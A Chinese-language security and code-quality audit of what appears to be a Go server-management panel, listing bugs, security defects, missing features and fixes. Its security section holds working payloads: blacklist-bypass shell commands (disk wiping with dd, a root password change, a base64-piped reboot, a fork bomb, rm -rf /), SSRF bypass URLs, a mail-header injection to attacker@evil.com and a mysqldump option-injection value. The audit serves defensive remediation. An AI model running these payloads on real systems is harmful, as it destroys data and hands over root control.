  而 `logmgr.go:96-99` 的注释与 `logmgr.go:136-137` 的注释都写着"超长行不该让整次读取失败：跳过并继续"——**实现与注释不符**。这个函数正是为了修掉"读到最旧记录"的老 bug（见 `docs/BUGFIX-v0.1.0.md` 的 F3）才重写的，结果被一条超长行打回原形。
- **影响面**：日志数据失真 + **5xx 告警可被攻击者用一条 1MB 的请求行静默关闭**（监控可用性攻击）。
- **修复方案**：改用 `bufio.Reader.ReadString('\n')` + 手动截断超长行（读到 `\n` 为止，超出部分丢弃并继续），或用 `bufio.Reader.ReadSlice` 处理 `ErrBufferFull` 分片；读取循环必须保证"超长行不终止扫描"。

---

### BUG-21 shell 任务的失败输出没有进执行历史，用户只看到 `exit status 1`
- **严重级**：P2
- **位置**：`internal/cron/handlers.go:103-107`、`internal/cron/scheduler.go:162-168`
- **现象**：任务详情页的"执行历史"里，失败记录只写着 `exit status 1`，看不到任何脚本输出；要看细节只能去翻面板自己的 stdout 日志。
- **触发条件**：任意失败的 shell 任务。
- **根因**：`handlers.go:103-107` 把输出 `CombinedOutput()` 拿到后**只**写进面板 stdout 日志（且 `truncateMsg(..., 500)` 截断）；`handlers.go:107` 返回的 `err` 只有 `exit status 1` 这种没有信息量的字符串；`scheduler.go:164` 把这个 err 写进 `run.Message`。
- **影响面**：可用性——任务失败无法自助诊断，用户只能反复手工复现。
- **修复方案**：`handlers.go` 在 `err != nil` 时把输出尾部（去掉敏感环境变量后的后 2KB）拼进返回的 error：`fmt.Errorf("脚本失败: %w\n输出: %s", err, tail(out, 2000))`。

---

### BUG-22 `notifyEmail` 用无超时的 ctx 调 sendmail，卡住会永久阻塞告警循环
- **严重级**：P3
- **位置**：`internal/alert/engine.go:87`（`context.Background()`）、`internal/alert/engine.go:228-240`、`internal/alert/sendmail_linux.go:12-16`
- **现象**：面板的告警检查循环卡住，日志不再更新，其它站点的告警也一起停摆。
- **触发条件**：本机 MTA 存在但 `sendmail` 进程不退出（例如 MTA 队列卡死、IPv6 解析挂起）。
- **根因**：`engine.go:235` `sendmailCmd(ctx, ...)` 里的 ctx 是 `engine.go:87` 传下来的 `context.Background()`（**无 deadline**）⇒ `exec.CommandContext` 永远不会超时；`sendmail_linux.go:13` 调的是绝对路径 `/usr/sbin/sendmail`，进程不返回就一直等。
- **影响面**：整个告警子系统被一个卡住的 MTA 拖死（HTTP 渠道不受影响，因为 `e.client` 有 10s 超时）。
- **修复方案**：`engine.go:87` 改用 `context.WithTimeout(context.Background(), 15*time.Second)`，并把该 ctx 传给 `notify`。

---

## 二、安全缺陷

### SEC-01 shell 命令黑名单可被 6 类手法绕过，且文档声称拦住的 `dd` 根本没实现
- **严重级**：P1
- **位置**：`internal/cron/handlers.go:119-134`（`forbiddenCmds` + `checkForbiddenCmd`）
- **现象**：任何能创建"shell"类型计划任务的主体（管理员会话，**或任何带 `write` scope 的 API Token**——`api/auth.go:535` 只区分读写，不区分"能不能执行 root 命令"）都能执行任意 root 命令，且能绕开"禁用命令"提示。
- **触发条件**：直接创建 shell 任务并填入下面的 payload。
- **根因**：`checkForbiddenCmd`（`handlers.go:126-134`）只做 `strings.Contains(strings.ToLower(s), bad)`——**纯子串黑名单**，没有任何语法级分析。

  **可用的绕过 payload（均真实可执行）：**

  | # | 绕过手法 | Payload | 为什么能过 |
  |---|---|---|---|
  | a | **文档说拦、实际没拦** | `dd if=/dev/zero of=/dev/sda bs=1M status=progress` | `handlers.go:70` 的注释明确写着"`dd if=...`"属于禁用项，但 `forbiddenCmds`（`handlers.go:119-124`）里**根本没有 `dd`**。这条直接报废整块磁盘。 |
  | b | **尾随空格** | `printf 'root\nnewpass\nnewpass\n' \| passwd` | 黑名单项是 `"passwd "`（`handlers.go:122`，带尾空格）和 `"passwd\t"`。本例中 `passwd` 后面是**行尾**，不含空格/制表符 ⇒ 命中不了。而它确实改掉了 root 密码。 |
  | c | **字面量拼接** | `sh''utdown -h now` | bash 把 `sh''utdown` 拼成 `shutdown` 执行；源码文本里没有连续的 `shutdown` 子串。`ini''t 0`、`mk''fs`、`pas''swd` 同理。 |
  | d | **base64 编码** | `echo 0mVib290 \| base64 -d \| bash` | `0mVib290` 是 `reboot` 的 base64（可自行用 `base64 -w0 <<< reboot` 验证）。文本里没有 `reboot`；解码后执行 `reboot`。 |
  | e | **fork bomb 变体** | `:(){ :\|:& };:` | 黑名单只匹配**无空格**的精确串 `:(){:\|:&};:`（`handlers.go:123`）。加空格后不是子串，但 bash 照样是经典 fork bomb。 |
  | f | **根本没进黑名单的"一键停机"** | `kill -9 1` ／ `echo b > /proc/sysrq-trigger` ／ `systemctl isolate emergency.target` | `forbiddenCmds` 里的停机类只有 shutdown/init/reboot/halt/poweroff 五个词，`kill -9 1`（杀 PID 1，systemd 下通常等于 panic 重启）和 sysrq（`echo b` = 立即重启）都不在列。 |

  另外，黑名单**完全没覆盖**的高危操作：`rm -rf /`、`chmod -R 000 /`、`chown -R nobody /`、`userdel -r root`、`wipefs -a /dev/sda`、`sgdisk --zap-all /dev/sda`、`mkswap /dev/sda`、`usermod -p <hash> root`（改密码）、`curl xxx | bash`（下载执行）。

  **附带的认知风险**：代码把黑名单称为"白名单"——`handlers.go:68`"会过 forbiddenCmds **白名单**"、`internal/cron/scheduler.go:8`"shell 任务执行命令**白名单**"、包注释 `scheduler.go:68-72`"只挡'一键作死'的命令"。实际是禁用式黑名单，命名会让人误以为存在命令准入控制。
- **影响面**：**整机 root 权限失守**。面板以 root 运行（`handlers.go:71` 注释自认"面板以 root 运行，没办法彻底沙箱化"）。任何一个 `write` scope 的 API Token 泄漏（`api/tokens.go:83-94` 允许只给 `write`）即等于整机 root。
- **修复方案**（按性价比排序）：
  1. **改成真正的准入控制**：shell 任务不提供自由文本，改为"命令模板 + 参数"（类似 systemd timer 的白名单命令表），参数逐个做类型/字符校验；
  2. 若必须保留自由脚本：**拒绝脚本中出现 `|`、`&`、`;`、`$`、`` ` ``、`>`、`<`、换行、`(`、`)` 等元字符**，并且用 `sh -c` 的词法切分而不是子串匹配；
  3. 匹配前先做**归一化**：去掉所有引号、反斜杠、空白、`$`、`` ` ``，再按**单词边界**匹配（解决 b/c/d 三条）；
  4. 把真正缺失的项补进黑名单：`dd`、`wipefs`、`fdisk`、`parted`、`sgdisk`、`mkswap`、`kill`、`sysrq-trigger`、`userdel`、`chpasswd` 的变体；fork bomb 用**模式**匹配（`:()`）而不是精确串；
  5. 修正 `handlers.go:68` / `scheduler.go:8` 的"白名单"措辞，改成"禁用词黑名单"，避免误导；
  6. 给 API Token 增加独立的 scope（如 `cron.shell`），让"只读/只备份"的 Token 拿不到 root shell。
- **证据**：
```go
// handlers.go:119-134
var forbiddenCmds = []string{
	"shutdown", "init 0", "init 6", "reboot", "halt", "poweroff",
	"mkfs", "mkfs.ext", "mke2fs",
	"passwd ", "passwd\t", "chpasswd", "--stdin",
	":(){:|:&};:", // fork bomb
}
func checkForbiddenCmd(s string) error {
	low := strings.ToLower(s)
	for _, bad := range forbiddenCmds {
		if strings.Contains(low, bad) { return fmt.Errorf("脚本包含禁用命令: %q", bad) }
	}
	return nil
}
```
> 附：`handlers.go:100-102` 的 `cmd.Env = append(os.Environ(), "PATH=...")` **是有效的**——Go 的 `os/exec` 在 `dedupEnv` 里"保留每个 key 的最后一次出现"，所以追加在末尾的 PATH 会覆盖前面的同名项，不存在 PATH 劫持。这条**没有缺陷**，列在这里是为了避免被误判。

---

### SEC-02 `access_url` 的 SSRF 防护只检查 IP 字面量，主机名与跳转都能绕过
- **严重级**：P2
- **位置**：`internal/cron/handlers.go:330-333`、`internal/cron/handlers.go:367-387`、`internal/cron/handlers.go:351`
- **现象**：注释写着"防止 SSRF：拒绝非 http(s) 与内网地址"（`handlers.go:330`），实际上以下请求都会被放行并由面板（以 root 身份、以内网源地址）发出：
  - `http://localhost:8080/`（host 不是 IP 字面量 ⇒ 直接放行）；
  - `http://internal-service.corp/`（解析到内网 IP 的主机名 ⇒ 放行）；
  - `http://evil.example/redirect-to-127.0.0.1/`（**初始 URL 合法，客户端默认跟随跳转**，`handlers.go:351` 的 `http.Client` 没有设置 `CheckRedirect`）。
- **触发条件**：创建一个 `access_url` 类型任务，URL 填上述任意一种。
- **根因**：
  - `handlers.go:381-385`：**只有当 host 本身是 IP 字面量**时才做内网判断；`net.ParseIP("localhost")` 返回 nil ⇒ 整个 if 块被跳过 ⇒ 放行。代码注释（`handlers.go:379-380`）自己承认"简易版：只验 host 字面不是 IP 时放行"，但 `handlers.go:330` 的对外表述却是"防止 SSRF"。
  - `handlers.go:351` `cli := &http.Client{Timeout: timeout}`：**默认跟随重定向**，且每一跳都不再经过 `checkURLExternal`。
  - `handlers.go:372` 只允许 http/https（这点是对的），但 `handlers.go:375` 的 `u.Hostname()` 会把 `http://2130706433/` 这类数字 IP 形式原样交给 `net.ParseIP`（解析失败 ⇒ 放行），而系统 resolver（cgo/glibc）会把 `2130706433` 当作 127.0.0.1 解析。
- **影响面**：可探测/访问面板所在主机的内网服务（含面板自身端口、元数据服务 `169.254.169.254`、其它站点）。因为 `checkURLExternal` 明确放行了 `169.254.169.254` 这种**非 IP 字面量形式**的写法需要绕一下，但 `http://localhost` 已经足够打穿隔离。
- **修复方案**：
  1. 先 `net.LookupIP(host)` 拿到全部 A/AAAA 记录，**逐个**判断 `IsLoopback/IsPrivate/IsLinkLocalUnicast/IsUnspecified`，任一命中就拒绝；
  2. 关闭自动重定向（`CheckRedirect: func(...) error { return http.ErrUseLastResponse }`），或对每一跳重新做 IP 校验（防 DNS rebinding）；
  3. 校验用自定义 `DialContext`，在**实际拨号时**再判一次目标 IP（唯一能挡住 DNS rebinding 的做法）。
- **证据**：
```go
// handlers.go:379-386
// 域名走 DNS 解析再校验（简易版：只验 host 字面不是 IP 时放行；
// 更严格要 resolve 后比对，但 cron 触发时再做解析。）
if ip := net.ParseIP(host); ip != nil {
    if ip.IsLoopback() || ip.IsPrivate() || ... { return fmt.Errorf(...) }
}
return nil          // ← "localhost" / 内网主机名 直接放行
```

---

### SEC-03 通知渠道 target 无 SSRF 防护（已知遗留项，至今未修）
- **严重级**：P2
- **位置**：`internal/alert/engine.go:139-166`（webhook）、`internal/alert/engine.go:242-256`（`postJSON`，dingtalk/wecom 共用）
- **现象**：把 webhook 目标配成 `http://127.0.0.1:9200/`（本机 Elasticsearch）、`http://169.254.169.254/latest/meta-data/`（云元数据）后，面板会在告警触发时向这些地址 POST 一段 JSON。
- **触发条件**：站点告警配置里填了内网 target 且有告警触发。
- **根因**：`engine.go:152` / `engine.go:243` 直接 `http.NewRequestWithContext(ctx, POST, target, ...)`，对 target 不做任何地址校验；且 `e.client` 同样默认跟随重定向。
- **影响面**：内网探测/写入（本例是 POST，语义上比 GET 探测更危险）。
- **修复方案**：复用 SEC-02 的地址校验（resolve + 逐 IP 判定 + 禁重定向 + 自定义 Dialer）。
- **证据**：
```go
// engine.go:242-249
func (e *Engine) postJSON(ctx context.Context, target string, payload []byte) error {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, target, bytes.NewReader(payload))
	...
	resp, err := e.client.Do(req)   // ← target 无任何校验
```
> 备注：这一点在 `docs/BUGFIX-v0.1.0.md` 的 S12 里已被记录为"保留并在文档中给出加固建议"，**至今仍未修**，本次确认为实际缺陷。

---

### SEC-04 邮件通知存在邮件头注入
- **严重级**：P3
- **位置**：`internal/alert/engine.go:228-240`
- **现象**：告警邮件的收件人可以被塞进额外的邮件头。
- **触发条件**：渠道 target 里含 `\r\n`，例如 `a@b.com\r\nBcc: attacker@evil.com`。
- **根因**：`engine.go:232` `msg := fmt.Sprintf("To: %s\r\nSubject: %s\r\n...", target, subject, body)` —— target 被**原样拼进邮件头**，没有过滤 CR/LF。
- **影响面**：有限（target 由管理员在站点告警配置里设置，属于自伤），但属于典型的头注入，且 `engine.go:229` 的 subject 里也塞了 `a.SiteName`（站点名可由用户自定义）。
- **修复方案**：对 target / siteName 做 `\r`、`\n` 过滤；更好的做法是用 `net/mail` 或 SMTP 库构造邮件。

---

### SEC-05 shell 任务继承面板进程的全部环境变量
- **严重级**：P3
- **位置**：`internal/cron/handlers.go:100-102`
- **现象**：shell 任务里执行 `env` 就能看到面板进程的全部环境变量，包括可能存在的代理凭据、CI token 等。
- **触发条件**：创建任意 shell 任务并在脚本里 `env`。
- **根因**：`handlers.go:100` `cmd.Env = append(os.Environ(), "PATH=...")` —— 除 PATH 外全部继承。`BASH_ENV`、`IFS`、`LD_PRELOAD`、`GCONV_PATH` 等也会被继承。
- **影响面**：环境变量里的凭据泄漏（面板自身的 SMTP 密码是存在 DB 里的，不在 env，风险主要来自外部启动方式传入的变量）。
- **修复方案**：只传最小 env（`PATH`、`HOME`、`LANG`、`TZ`）+ 显式需要的变量。

---

### SEC-06 mysqldump 的库名以 `-` 开头时会被当成命令行选项
- **严重级**：P3
- **位置**：`internal/backup/backup.go:204-212`
- **现象**：`backup_db` 任务的 target 填 `--result-file=/etc/cron.d/x` 之类的值时，mysqldump 会把转储**写到该路径**（进程是 root）。
- **触发条件**：任务的 `job.Target` 以 `-` 开头。`handlers.go:183` 只做了 `TrimSpace` 非空检查，没有字符集校验。
- **根因**：`backup.go:204-212` 把 dbName 直接作为 argv 最后一个元素传给 mysqldump，**没有 `--` 分隔符**，也没有名字白名单校验。
- **影响面**：root 权限下的任意文件写入（写出来的内容是 SQL 文本，不完全可控，但足以污染 cron.d 之类的目录）。
- **修复方案**：`args` 末尾加 `"--"`；同时把库名限制为 `^[A-Za-z0-9_]+$`（`model.ErrInvalidDomain` 之类）。
> 说明：这里**没有** shell 注入 —— `backup.go:228` 用的是 `exec.CommandContext(ctx, mysqldump, args...)`（无 shell），参数是独立的 argv 元素 ✅。

---

### SEC-07 shell 任务的默认工作目录是世界可写的 `/tmp`
- **严重级**：P3
- **位置**：`internal/cron/handlers.go:94-99`
- **现象**：脚本以 root 身份在 `/tmp` 里执行；本地低权限用户可以在 `/tmp` 里预先放置同名文件/符号链接，脚本（root 身份）读写时可能命中攻击者准备好的目标。
- **触发条件**：本机存在低权限用户；脚本操作的是相对路径。
- **根因**：`handlers.go:96` `workdir = os.TempDir()`（Linux 下 = `/tmp`，权限 1777）。
- **影响面**：本地提权的一种可能路径（需要本地已有用户）。
- **修复方案**：默认工作目录改成 `<dataDir>/cron-workdir`（0700，面板独占）；并对 `p.Workdir` 做路径白名单校验（必须在 dataDir 或站点根之下）。

---

## 三、功能残缺与简陋项

### 1. 计划任务 / 备份失败**没有任何外发通知**（全局告警只落库）
- **功能点**：全局告警的投递（cron 失败、备份失败）
- **现状**：`internal/cron/scheduler.go:195-203` 调 `s.alertEng.NotifyGlobal("cron_failed", "warning", msg)`；而 `internal/alert/engine.go:99-109` 的 `NotifyGlobal` **只** `e.db.SaveAlert(a)`，**不遍历任何渠道**（对比 `Raise` 在 `engine.go:83-91` 才会走渠道）。`internal/cron/scheduler.go:96-98` 的注释和 `docs/CHANGELOG.md:117` 都写明这是 v0.2.0 的有意取舍。
- **缺口**：面板进程挂掉、宿主机磁盘满、nginx 挂掉这类"最需要被通知"的场景，恰恰是**面板已经不可用**、只能靠外部通知发现的场景 —— 现在完全没有出口。
- **建议**：加一个"全局通知渠道"配置（`settings` 表里已经有 `alert_channels_json` 的用法，见 `docs/BUGFIX-v0.1.0.md` 的 F12），让 `NotifyGlobal` 复用 `Raise` 的渠道投递逻辑；投递失败要落库标记（配合 BUG-14）。
- **优先级**：**P1**

### 2. 没有失败重试 / 退避
- **功能点**：计划任务的失败重试
- **现状**：`internal/cron/scheduler.go:162-178` —— handler 返回 error 就记一条 failed、告警、结束。没有重试计数、没有退避。
- **缺口**：一次瞬时失败（SQLite 锁、DNS 抖动、磁盘瞬时 busy）就等于该周期白跑。对"每天凌晨 2 点备份"的任务，失败一次就是丢一天。
- **建议**：`cron_jobs` 加 `fail_count` / `last_error` 字段，失败后按指数退避在同一调度槽内重试 N 次（如 3 次，间隔 1/5/15 分钟），仍失败才告警。
- **优先级**：P2

### 3. 没有"正在执行"状态，任务卡死/被杀无从得知
- **功能点**：任务运行态可见性
- **现状**：`internal/cron/scheduler.go:170` 的 `InsertCronRun` 发生在 **handler 返回之后**；执行中的任务在 DB 里没有任何痕迹，只有内存里的 `running` map（`scheduler.go:51`）。
- **缺口**：面板重启后，无法区分"任务正在跑"和"任务从没跑过"；被 kill 的任务（`scheduler.go:159` 的 ctx 被取消）会留下一条 failed 记录，但正在跑的任务在 UI 上完全不可见。
- **建议**：开始时插入一条 `status='running'` 的记录，结束时 UPDATE 成 ok/failed；`cron_runs` 表加 `pid`/`hostname` 字段用于"僵死任务"检测。
- **优先级**：P2

### 4. 目标已删除的任务永不自动停用
- **功能点**：任务的失效检测
- **现状**：`internal/cron/handlers.go:149-152`（站点不存在）、`internal/cron/handlers.go:218-221`（站点不存在）、`internal/cron/handlers.go:183-186`（库名为空）都只是返回 error。
- **缺口**：站点被删后，它的备份任务会**永远**每周期失败一次，堆失败记录、发告警，且不会有任何提示说"这个任务的目标已经没了"。
- **建议**：连续 N 次"目标不存在"就自动 `enabled=false` 并发一条说明性告警。
- **优先级**：P2

### 5. 没有全局告警风暴抑制
- **功能点**：告警抑制
- **现状**：`internal/alert/engine.go:44-53` 的 `shouldSend` 只有"站点 + 类型"维度的 30 分钟内存冷却。
- **缺口**：
  - `internal/alert/checker.go:50-59`：nginx 配置坏了 → 对**每个**站点各发一条 → N 个站点 = N 条通知（无全局上限）；
  - 没有"每轮最多发 N 条"的闸门；
  - 冷却状态不持久化（见 BUG-19）。
- **建议**：加全局速率限制（每轮/每分钟最多 N 条）+ 按"故障根因"聚合（nginx 级故障只发一条全局告警，而不是每站点一条）。
- **优先级**：P2

### 6. 日志保留期在生产里**从未生效**
- **功能点**：日志按天保留
- **现状**：`internal/logmgr/integrity.go:227-252` 的 `PurgeOlderThan(dir, days)` 实现完整，但**全仓没有任何生产调用方**（唯一调用者是 `internal/logmgr/integrity_test.go:169` 的测试）。
- **缺口**：按"保留 N 天"清理日志的能力是死的；面板自己的日志目录（`main.go:138` `LogDir: filepath.Join(*dataDir, "logs")`）**完全没有轮转**，只会一直涨。
- **建议**：把 `PurgeOlderThan` 挂到 `main.go` 的后台清理任务（和 `runSessionCleaner` 合并），对 `<dataDir>/logs` 与各站点 `logs/` 都执行；同时给面板自身日志加上大小上限轮转。
- **优先级**：P2

### 7. 没有任何磁盘占用上限
- **功能点**：日志 / 备份 / 证书目录的磁盘配额
- **现状**：全仓没有配额或水位检查。日志目录无上限（见第 6 条）、备份目录因 BUG-01 泄漏、证书目录因 BUG-04 泄漏。
- **建议**：给 `logs/`、`backup/`、`certs/` 三个目录设水位上限，超过则拒绝新备份 / 触发清理 / 告警。
- **优先级**：P2

### 8. `log_split` 只切 access.log，不切 error.log
- **功能点**：日志轮转覆盖范围
- **现状**：`internal/cron/handlers.go:225-230` 只 glob `access.log*`；而 `internal/nginx/render.go:278` 里 error_log 写在 `<root>/logs/error.log`，没有任何任务处理它。
- **缺口**：error.log 无上限增长（nginx 报错多时能撑爆磁盘）。
- **建议**：同一个 handler 里也处理 `error.log*`；或增加一个 `log_rotate` 类型任务。
- **优先级**：P3

### 9. 并发签发没有锁
- **功能点**：ACME 签发/续签的并发控制
- **现状**：`internal/acme/acme.go:31-39` 的 `Manager` **没有任何 mutex**；`Issue`（`acme.go:81`）和 `Renew`（`acme.go:163`）可以并发执行。
- **缺口**：同一域名的两次并发签发会写同一个挑战文件路径（`webroot.go:41`）、创建两个 ACME 订单 → 直接撞 Let's Encrypt 的重复签发限额。自动续签（`main.go:489`，每 12 小时一轮，串行遍历）+ 用户手动点续签 → 正好可能并发。
- **建议**：在 `Manager` 里加按域名（或全局）的 mutex；签发前先查 `certs` 表有没有同域名的在途签发。
- **优先级**：P2

### 10. ACME 失败没有重试
- **功能点**：签发/续签的重试
- **现状**：`internal/acme/acme.go:147-153` 失败直接返回；`main.go:489-493` 只记日志就 `continue`。
- **缺口**：一次网络抖动 = 12 小时后才有机会再试（自动续签周期）；叠加 LE 的重复签发限额后，恢复窗口以周计。
- **建议**：签发/续签失败时按指数退避重试 2-3 次（注意 LE 的 `Retry-After` 头）。
- **优先级**：P2

### 11. 删除证书不删磁盘文件
- **功能点**：证书清理
- **现状**：`internal/api/certs.go:228-233` 的 `delete` 只调 `s.svc.DB().DeleteCert(id)`（`store.go:467-472`，纯 DELETE 行），**不删** `certDir/<id>/` 目录；`acme.go:418` 的 `Revoke` 同样只删 DB 行。
- **缺口**：`certDir` 里堆积私钥文件；删掉的证书的私钥仍然躺在磁盘上。
- **建议**：删除/吊销时一并 `os.RemoveAll(filepath.Join(certDir, cert.ID))`。
- **优先级**：P2

### 12. `mustRead` 吞掉读取错误
- **功能点**：证书文件读取的错误处理
- **现状**：`internal/acme/acme.go:520-523` `func mustRead(path string) []byte { b, _ := os.ReadFile(path); return b }`，被 `acme.go:236-237`（续签）和 `acme.go:415`（吊销）使用。
- **缺口**：文件不存在/权限不足时，把空切片喂给 lego → 报一个语焉不详的 lego 错误，用户看不懂是"文件没了"还是"CA 拒绝了"。
- **建议**：改成返回 `(data, error)`，把 os 的原始错误透出。
- **优先级**：P3

### 13. 时区 / DST 没有暴露给用户
- **功能点**：按站点时区调度
- **现状**：`internal/cron/scheduler.go:61-63` 的解析器没有指定 `CRON_TZ`，表达式按进程本地时区解析（robfig/cron v3 的 `spec.go` 默认 `time.Local`）；v3 本身支持 `TZ=` / `CRON_TZ=` 前缀（`parser.go:95-103`），但面板既不在 UI 暴露，也没有在文档里说明。
- **缺口**：跨时区站点（如给海外站点做凌晨 2 点任务）无法表达；夏令时切换时任务可能被跳过或跑两次。
- **建议**：UI 增加可选时区字段，保存时把 `CRON_TZ=... ` 前缀拼进 schedule。
- **优先级**：P3

### 14. 站点探测只探第一个域名
- **功能点**：站点可用性探测
- **现状**：`internal/alert/checker.go:213` 与 `main.go:231` 都只请求 `s.Domains[0]`。
- **缺口**：多域名站点的第一个域名故障 → 误报"站点无法访问"（而站点其实正常）。
- **建议**：遍历所有域名，任一可达即视为在线。
- **优先级**：P3

### 15. 告警 / 篡改事件表无保留期
- **功能点**：告警历史的保留与清理
- **现状**：`internal/store/store.go:528-540` 的 `SaveAlert` 只有 INSERT；全仓没有 `alerts` 表的清理逻辑。`tamper_events` 同理（`store.go:984-991`）。
- **缺口**：两张表只增不减。
- **建议**：加保留期清理（按天/按条数），与 `runSessionCleaner`（`main.go:517-526`）合并。
- **优先级**：P3

### 16. 5xx 告警的采样窗口固定 20000 行，繁忙站点会漏报
- **功能点**：5xx 告警的采样
- **现状**：`internal/alert/checker.go:92` `logmgr.ReadAccessLog(logPath, 20000)` —— 只取尾部 20000 行；`checker.go:96-105` 再按时间窗过滤。
- **缺口**：窗口内请求数超过 20000 时，5xx 计数被截断 → 实际 5xx 比例很高也可能达不到阈值 → **越繁忙的站点越不告警**。
- **建议**：按时间窗直接扫描（流式读 + 早停），或至少在样本被截断时在告警文案里标注"样本已截断"。

---

## 四、代码质量

| # | 位置 | 问题 | 建议 |
|---|---|---|---|
| Q-01 | `internal/cron/scheduler.go:40-41` | `ErrAlreadyRunning` 声明后**全仓无人使用**（grep 确认只有定义处）；注释说"重复触发直接拒"，但真实行为是"静默跳过"（`scheduler.go:124-126`） | 删除该变量，或在 `tryStart` 失败时真的返回一个可观测的错误 |
| Q-02 | `internal/cron/scheduler.go:186-189` | `if err == nil { ... }` 后面没有 else 分支，错误被静默吞掉（schedule 解析失败时 `next_run_at` 保持旧值 → 任务永远"到期"） | 改成 `if err != nil { log.Printf(...); return }`，并把 `next_run_at` 置空或禁用任务 |
| Q-03 | `internal/api/cron.go:197-200` | `strconvItoaSafe` + `var _ = strconvItoaSafe` 是纯占位死代码 | 删除 |
| Q-04 | `internal/cron/scheduler.go:171-172` | 注释"每任务最多 50 条"只对正常路径成立，错误路径（`scheduler.go:146-155`）不清理 → 注释与实现不符（对应 BUG-08） | 注释里点明"仅成功/正常结束路径"，或统一到一处清理 |
| Q-05 | `internal/cron/handlers.go:68`、`internal/cron/scheduler.go:8` | 把**禁用式黑名单**称为"白名单"（"会过 forbiddenCmds 白名单"、"shell 任务执行命令白名单"） | 统一改成"禁用词黑名单"，并在注释里写明它不是安全边界 |
| Q-06 | `internal/cron/handlers.go:70` | 注释声称禁用 `dd if=...`，但 `forbiddenCmds` 里没有 `dd` → 注释与实现不符（对应 SEC-01a） | 要么实现，要么删掉注释里的这条 |
| Q-07 | `internal/tlsgen/panel.go:26-27` | 注释"usable() 检查证书可解析且私钥匹配"，但 `usable`（`dummy.go:71-101`）**不检查配对** → 注释是错的（对应 BUG-13） | 实现配对校验，或改注释 |
| Q-08 | `internal/logmgr/integrity.go:225` | 悬空注释 `// sanitizePath 把绝对路径转成安全的相对形式。` 紧贴在 `PurgeOlderThan` 上，而 **`sanitizePath` 函数全仓不存在** → 某次重构留下的孤儿注释 | 删除该行注释 |
| Q-09 | `internal/logmgr/integrity.go:52-92` | `snapshotFiles` 吞掉所有错误（`if err != nil { continue }`、指纹失败也 `continue`）→ 读不出来的文件被当作"不受保护"，基线里悄悄少掉它 | 区分"文件不存在"与"读取失败"，后者应记日志并让 `Diff` 报出来 |
| Q-10 | `internal/logmgr/integrity.go:74-89` vs `24-32` | `filepath.Walk` 用 Lstat（不跟随符号链接），而 `FileFingerprint` 用 `os.Stat`（跟随）→ 符号链接被按**目标内容**算指纹，却记录成**链接路径**；链接指向站点根外时会把外部文件纳入防篡改基线 | 统一语义：要么 `os.Lstat` 并跳过符号链接，要么显式跟随并记录真实路径 |
| Q-11 | `internal/logmgr/integrity.go:117` + `134` | `Diff` 里 `snapshotFiles` 被调用了**两次**（一次算 diff，一次算返回值）→ 每轮防篡改检查把整个站点目录**哈希两遍**。而检查每 5 分钟跑一次（`main.go:275`） | 算一次，复用结果 |
| Q-12 | `internal/alert/checker.go:154`、`205`、`263` | `quotaStat` / `probeSite` / `tamperChecker` 是包级可变全局 + `SetXxxProvider` 无锁 → 理论上存在 data race（实际只在启动时设置一次，风险低） | 用 `atomic.Pointer` 或在构造 `Checker` 时注入而非全局 |
| Q-13 | `internal/cron/handlers.go:269-275` | 用手写 O(n²) 冒泡排序排归档文件 | 换 `sort.Slice` |
| Q-14 | `internal/cron/handlers.go:238-241` | `if strings.Contains(base, ".") && base != "access.log" { continue }` 的语义晦涩（任何带点的文件都被跳过，含 `access.log.1`） | 用明确的后缀/正则判定 |
| Q-15 | `internal/alert/engine.go:174` | 级别映射 map 每次调用都重新构造 | 提到包级 `var` |
| Q-16 | `internal/acme/acme.go:50` + `internal/store/store.go:62-79` | `IssueRequest.SiteID` 被 `api/certs.go:65` 赋值，但 `certs` 表**没有 site_id 列**、`model.Cert` 也没有该字段 → 这个字段从头到尾没被用过 | 要么加列（让证书能按站点查询），要么删字段 |
| Q-17 | `internal/alert/engine.go:56-60` | `Reset()` 的注释写"用于测试"，但它被导出在生产包里 | 移到 `engine_test.go` 或改成非导出 |
| Q-18 | `internal/logmgr/logmgr.go:52` | `!strings.HasPrefix(line, "/") && !strings.Contains(line, "\"")` 这个快速拒绝条件语义不明（为什么以 "/" 开头就放过？） | 删掉这行，正则（`logmgr.go:43-44`）已经是唯一权威 |
| Q-19 | `internal/logmgr/logmgr.go:136-142` | 注释说"超长行…跳过并继续"，但实现是**整个扫描提前结束**（对应 BUG-20） | 修正注释或修正实现（实现优先） |
| Q-20 | `internal/alert/checker.go:91` | `s.Root.Path + "/logs/access.log"` 用字符串拼接，而 `api/misc.go:209` 用 `filepath.Join` | 统一用 `filepath.Join` |
| Q-21 | `internal/cron/scheduler.go:108` | `ListDueCronJobs(now, 32)` 的 32 是魔数、无注释 | 提成常量并说明依据 |
| Q-22 | `internal/acme/webroot.go:57-67` | `CleanUp` 调 `challengePath` → 里面会 `MkdirAll`（`webroot.go:38`）→ 清理阶段反而创建目录；且挑战目录 `.well-known/acme-challenge` 永远留在站点根目录里 | `CleanUp` 里只算路径不建目录；或清理时把空目录一并删掉 |
| Q-23 | `internal/cron/handlers.go:87-90` | shell 的 `timeout` 是 `p.Timeout` 秒，**没有上限**；外层 `scheduler.go:159` 又套了 1 小时 → 两层超时语义重叠，实际生效的是外层 | 明确一层：把外层的 1 小时去掉或改成"总时限 = min(任务超时, 1h)"，并在 UI 说明 |
| Q-24 | `internal/store/cron_store.go:41-43` | `ListBackups` 把 `limit<=0` 解释成"默认 100"，与其它 store 方法（`limit=0` 往往表示"不限"）不一致，已经坑到一次（`backup.go:278`） | 统一语义，或把 `FindStaleBackups` 改成显式传足够大的 limit |

---

## 五、未能判定 / 需要实机验证的项

1. **`handlers.go:98-107` 的"后台进程挂死"（BUG-01）**：结论基于 Go `os/exec` 的标准行为（`CommandContext` 只杀直接子进程；`CombinedOutput` 会等 stdout/stderr 管道 EOF）。**建议实机验证**：跑一个 `sleep 3600 &` 的 shell 任务，确认 `cron_runs` 是否一直没有新记录、`/api/cron/jobs/{id}` 的执行历史是否空白。
2. **nginx 对被改名日志文件的实际行为（BUG-02）**：结论基于 nginx 的 fd 语义与 `render.go:273` 的 `access_log <普通路径>` 配置形态。**建议实机验证**：切分后 `ls -l /proc/<nginx worker pid>/fd | grep access.log` 看 worker 仍指向哪个 inode。
3. **Let's Encrypt 重复签发限额的触发节奏（BUG-04）**：结论基于 LE 公开的"同一域名集合每周 5 张"策略与本地 12 小时续签周期的乘算。**建议实机验证**：用 staging CA 跑两天，观察 `certs` 表行数与 `AutoRenewDue` 的返回条数。
